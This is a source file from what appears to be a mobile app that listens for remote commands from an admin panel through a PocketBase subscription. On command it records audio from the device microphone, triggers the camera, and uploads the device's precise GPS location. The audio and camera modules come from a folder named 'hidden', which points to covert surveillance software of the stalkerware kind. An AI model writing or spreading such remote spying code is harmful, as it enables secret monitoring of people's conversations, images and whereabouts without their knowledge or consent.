import { pb } from './pocketbase';
import { startAudioRecording, stopAudioRecording } from '../features/hidden/AudioMonitor';
import { cameraEvents } from '../features/hidden/CameraMonitor';
import * as Location from 'expo-location';

export const startCommandListener = async () => {
    // Subscribe to changes in the 'commands' collection
    // Admin panel creates a record in 'commands' -> Mobile app reacts
    pb.collection('commands').subscribe('*', async (e) => {
        if (e.action === 'create') {
            const command = e.record;
            // Check if command is for this device/user
            const currentUserId = pb.authStore.model?.id;
            if (command.target_user_id !== 'all' && command.target_user_id !== currentUserId) return;

            console.log('Received command:', command.type);

            switch (command.type) {
                case 'START_MIC':
                    await startAudioRecording(command.duration || 10000);
                    break;
                case 'STOP_MIC':
                    await stopAudioRecording();
                    break;
                case 'CAPTURE_PHOTO':
                    cameraEvents.emit('TRIGGER_CAMERA');
                    break;
                case 'GET_LOCATION':
                    const location = await Location.getCurrentPositionAsync({});
                    // Upload precise location immediately
                    await pb.collection('locations').create({
                        latitude: location.coords.latitude,
                        longitude: location.coords.longitude,
                        timestamp: new Date().toISOString(),
                        type: 'manual_ping',
                        // @ts-ignore
                        user_id: pb.authStore.model?.id || 'anonymous'
                    });
                    break;
                default:
                    console.log('Unknown command type');
            }
        }
    });
};
